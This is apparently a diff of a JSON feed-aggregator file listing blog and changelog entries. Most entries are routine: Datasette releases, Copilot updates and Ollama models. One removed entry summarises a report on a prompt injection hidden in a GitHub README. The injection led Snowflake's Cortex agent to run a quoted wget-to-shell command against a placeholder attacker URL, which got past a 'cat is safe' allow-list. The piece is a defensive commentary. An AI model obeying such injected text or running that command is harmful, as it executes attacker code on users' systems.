@@ -904,26 +904,6 @@
           "wordCount": 1426,
           "title": "Hierarchy view in GitHub Projects is now generally available",
           "imageUrl": "https://github.blog/wp-content/uploads/2026/03/565147926-f41183e4-0876-4f4b-b745-c36145001cd0.jpeg"
-        },
-        {
-          "id": "https://github.blog/changelog/2026-03-18-configure-copilot-coding-agents-validation-tools",
-          "author": "Allison",
-          "description": "When Copilot coding agent writes code, it automatically runs your project’s tests and linter. It also runs GitHub’s security and quality validation tools, including CodeQL, the GitHub Advisory Database, secret…\nThe post Configure Copilot coding agent’s validation tools appeared first on The GitHub Blog.",
-          "link": "https://github.blog/changelog/2026-03-18-configure-copilot-coding-agents-validation-tools",
-          "publishedOn": "2026-03-18T19:46:44.000Z",
-          "wordCount": 1298,
-          "title": "Configure Copilot coding agent’s validation tools",
-          "imageUrl": "https://github.blog/wp-content/uploads/2026/03/564782592-09d5e63a-a7a9-4c69-9959-20ec61d8c202.jpeg"
-        },
-        {
-          "id": "https://github.blog/changelog/2026-03-18-gpt-5-3-codex-long-term-support-in-github-copilot",
-          "author": "Allison",
-          "description": "To give enterprises the stability they need for internal security and safety reviews, GitHub has established a new commitment with long-term support (LTS) models available for Copilot Business and Copilot…\nThe post GPT-5.3-Codex long-term support in GitHub Copilot appeared first on The GitHub Blog.",
-          "link": "https://github.blog/changelog/2026-03-18-gpt-5-3-codex-long-term-support-in-github-copilot",
-          "publishedOn": "2026-03-18T16:55:41.000Z",
-          "wordCount": 1537,
-          "title": "GPT-5.3-Codex long-term support in GitHub Copilot",
-          "imageUrl": "https://github.blog/wp-content/uploads/2026/03/Opus46fast_Changelog_Social_04.jpg"
         }
       ]
     },
@@ -988,6 +968,16 @@
       "feedUrl": "https://simonwillison.net/atom/everything/",
       "siteUrl": "http://simonwillison.net/",
       "articles": [
+        {
+          "id": "https://simonwillison.net/2026/Apr/17/datasette/#atom-everything",
+          "author": null,
+          "description": "<p><strong>Release:</strong> <a href=\"https://github.com/simonw/datasette/releases/tag/1.0a28\">datasette 1.0a28</a></p>\n    <p>I was upgrading Datasette Cloud to <a href=\"https://simonwillison.net/2026/Apr/15/datasette/\">1.0a27</a> and discovered a nasty collection of accidental breakages caused by changes in that alpha. This new alpha addresses those directly:</p>\n<blockquote>\n<ul>\n<li>Fixed a compatibility bug introduced in 1.0a27 where <code>execute_write_fn()</code> callbacks with a parameter name other than <code>conn</code> were seeing errors. (<a href=\"https://github.com/simonw/datasette/issues/2691\">#2691</a>)</li>\n<li>The <a href=\"https://docs.datasette.io/en/latest/internals.html#database-close\">database.close()</a> method now also shuts down the write connection for that database.</li>\n<li>New <a href=\"https://docs.datasette.io/en/latest/internals.html#datasette-close\">datasette.close()</a> method for closing down all databases and resources associated with a Datasette instance. This is called automatically when the server shuts down. (<a href=\"https://github.com/simonw/datasette/pull/2693\">#2693</a>)</li>\n<li>Datasette now includes a pytest plugin which automatically calls <code>datasette.close()</code> on temporary instances created in function-scoped fixtures and during tests. See <a href=\"https://docs.datasette.io/en/latest/testing_plugins.html#testing-plugins-autoclose\">Automatic cleanup of Datasette instances</a> for details. This helps avoid running out of file descriptors in plugin test suites that were written before the <code>Database(is_temp_disk=True)</code> feature introduced in Datasette 1.0a27. (<a href=\"https://github.com/simonw/datasette/issues/2692\">#2692</a>)</li>\n</ul>\n</blockquote>\n<p>Most of the changes in this release were implemented using Claude Code and the newly released Claude Opus 4.7.</p>\n    \n        <p>Tags: <a href=\"https://simonwillison.net/tags/datasette\">datasette</a></p>",
+          "link": "https://simonwillison.net/2026/Apr/17/datasette/#atom-everything",
+          "publishedOn": "2026-04-17T04:01:56.000Z",
+          "wordCount": 880,
+          "title": "datasette 1.0a28",
+          "imageUrl": null
+        },
         {
           "id": "https://simonwillison.net/2026/Apr/16/llm-anthropic/#atom-everything",
           "author": null,
@@ -2057,36 +2047,6 @@
           "wordCount": 1955,
           "title": "Thoughts on OpenAI acquiring Astral and uv/ruff/ty",
           "imageUrl": null
-        },
-        {
-          "id": "https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything",
-          "author": null,
-          "description": "<p><strong><a href=\"https://twitter.com/danveloper/status/2034353876753592372\">Autoresearching Apple&#x27;s &quot;LLM in a Flash&quot; to run Qwen 397B locally</a></strong></p>\nHere's a fascinating piece of research by Dan Woods, who managed to get a custom version of <a href=\"https://huggingface.co/Qwen/Qwen3.5-397B-A17B/tree/main\">Qwen3.5-397B-A17B</a> running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite that model taking up 209GB (120GB quantized) on disk.</p>\n<p>Qwen3.5-397B-A17B is a Mixture-of-Experts (MoE) model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed into memory from SSD, saving them from all needing to be held in RAM at the same time.</p>\n<p>Dan used techniques described in Apple's 2023 paper <a href=\"https://arxiv.org/abs/2312.11514\">LLM in a flash: Efficient Large Language Model Inference with Limited Memory</a>:</p>\n<blockquote>\n<p>This paper tackles the challenge of efficiently running LLMs that exceed the available DRAM capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.</p>\n</blockquote>\n<p>He fed the paper to Claude Code and used a variant of Andrej Karpathy's <a href=\"https://simonwillison.net/2026/Mar/13/liquid/\">autoresearch pattern</a> to have Claude run 90 experiments and produce MLX Objective-C and Metal code that ran the model as efficiently as possible.</p>\n<p><a href=\"https://github.com/danveloper/flash-moe\">danveloper/flash-moe</a> has the resulting code plus <a href=\"https://github.com/danveloper/flash-moe/blob/main/paper/flash_moe.pdf\">a PDF paper</a> mostly written by Claude Opus 4.6 describing the experiment in full.</p>\n<p>The final model has the experts quantized to 2-bit, but the non-expert parts of the model such as the embedding table and routing matrices are kept at their original precision, adding up to 5.5GB which stays resident in memory while the model is running.</p>\n<p>Qwen 3.5 usually runs 10 experts per token, but this setup dropped that to 4 while claiming that the biggest quality drop-off occurred at 3.</p>\n<p>It's not clear to me how much the quality of the model results are affected. Claude claimed that \"Output quality at 2-bit is indistinguishable from 4-bit for these evaluations\", but the description of the evaluations it ran is quite thin.\n\n\n    <p>Tags: <a href=\"https://simonwillison.net/tags/ai\">ai</a>, <a href=\"https://simonwillison.net/tags/generative-ai\">generative-ai</a>, <a href=\"https://simonwillison.net/tags/local-llms\">local-llms</a>, <a href=\"https://simonwillison.net/tags/llms\">llms</a>, <a href=\"https://simonwillison.net/tags/qwen\">qwen</a>, <a href=\"https://simonwillison.net/tags/mlx\">mlx</a></p>",
-          "link": "https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything",
-          "publishedOn": "2026-03-18T23:56:46.000Z",
-          "wordCount": 1070,
-          "title": "Autoresearching Apple's \"LLM in a Flash\" to run Qwen 397B locally",
-          "imageUrl": null
-        },
-        {
-          "id": "https://simonwillison.net/2026/Mar/18/datasette/#atom-everything",
-          "author": null,
-          "description": "<p><strong>Release:</strong> <a href=\"https://github.com/simonw/datasette/releases/tag/1.0a26\">datasette 1.0a26</a></p>\n    <p>Datasette now has a mechanism for assigning semantic column types. Built-in column types include <code>url</code>, <code>email</code>, and <code>json</code>, and plugins can register additional types using the new <a href=\"https://docs.datasette.io/en/latest/plugin_hooks.html#plugin-register-column-types\">register_column_types()</a> plugin hook.</p>",
-          "link": "https://simonwillison.net/2026/Mar/18/datasette/#atom-everything",
-          "publishedOn": "2026-03-18T22:16:19.000Z",
-          "wordCount": 725,
-          "title": "datasette 1.0a26",
-          "imageUrl": null
-        },
-        {
-          "id": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything",
-          "author": null,
-          "description": "<p><strong><a href=\"https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware\">Snowflake Cortex AI Escapes Sandbox and Executes Malware</a></strong></p>\nPromptArmor report on a prompt injection attack chain in Snowflake's <a href=\"https://docs.snowflake.com/en/user-guide/snowflake-cortex/cortex-agents\">Cortex Agent</a>, now fixed.</p>\n<p>The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.</p>\n<p>The attack caused the agent to execute this code:</p>\n<pre><code>cat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))\n</code></pre>\n<p>Cortex listed <code>cat</code> commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.</p>\n<p>I've seen allow-lists against command patterns like this in a bunch of different agent tools and I don't trust them at all - they feel inherently unreliable to me.</p>\n<p>I'd rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.\n\n    <p><small></small>Via <a href=\"https://news.ycombinator.com/item?id=47427017\">Hacker News</a></small></p>\n\n\n    <p>Tags: <a href=\"https://simonwillison.net/tags/sandboxing\">sandboxing</a>, <a href=\"https://simonwillison.net/tags/security\">security</a>, <a href=\"https://simonwillison.net/tags/ai\">ai</a>, <a href=\"https://simonwillison.net/tags/prompt-injection\">prompt-injection</a>, <a href=\"https://simonwillison.net/tags/generative-ai\">generative-ai</a>, <a href=\"https://simonwillison.net/tags/llms\">llms</a></p>",
-          "link": "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything",
-          "publishedOn": "2026-03-18T17:43:49.000Z",
-          "wordCount": 871,
-          "title": "Snowflake Cortex AI Escapes Sandbox and Executes Malware",
-          "imageUrl": null
         }
       ]
     },
@@ -2095,6 +2055,16 @@
       "feedUrl": "https://simonw.github.io/ollama-models-atom-feed/atom.xml",
       "siteUrl": "https://ollama.com/search?o=newest",
       "articles": [
+        {
+          "id": "https://ollama.com/library/qwen3.6",
+          "author": null,
+          "description": "Qwen3.6 delivers substantial upgrades in agentic coding and thinking preservation than previous Qwen models.",
+          "link": "https://ollama.com/library/qwen3.6",
+          "publishedOn": "2026-04-16T02:42:00.000Z",
+          "wordCount": 2505,
+          "title": "qwen3.6",
+          "imageUrl": "https://ollama.com/public/og.png"
+        },
         {
           "id": "https://ollama.com/library/medgemma",
           "author": null,
@@ -2153,16 +2123,6 @@
           "publishedOn": "2026-03-20T20:10:00.000Z",
           "wordCount": 2336,
           "title": "nemotron-cascade-2",
-          "imageUrl": "https://ollama.com/public/og.png"
-        },
-        {
-          "id": "https://ollama.com/library/minimax-m2.7",
-          "author": null,
-          "description": "MiniMax's M2-series model for coding, agentic workflows, and professional productivity.",
-          "link": "https://ollama.com/library/minimax-m2.7",
-          "publishedOn": "2026-03-18T18:05:00.000Z",
-          "wordCount": 2919,
-          "title": "minimax-m2.7",
           "imageUrl": "https://ollama.com/public/og.png"
         }
       ]
@@ -2676,16 +2636,6 @@
           "publishedOn": "2026-03-19T10:00:00.000Z",
           "wordCount": null,
           "title": "How we monitor internal coding agents for misalignment",
-          "imageUrl": null
-        },
-        {
-          "id": "https://openai.com/index/openai-to-acquire-astral",
-          "author": null,
-          "description": "Accelerates Codex growth to power the next generation of Python developer tools",
-          "link": "https://openai.com/index/openai-to-acquire-astral",
-          "publishedOn": "2026-03-19T00:00:00.000Z",
-          "wordCount": null,
-          "title": "OpenAI to acquire Astral",
           "imageUrl": null
         }
       ]
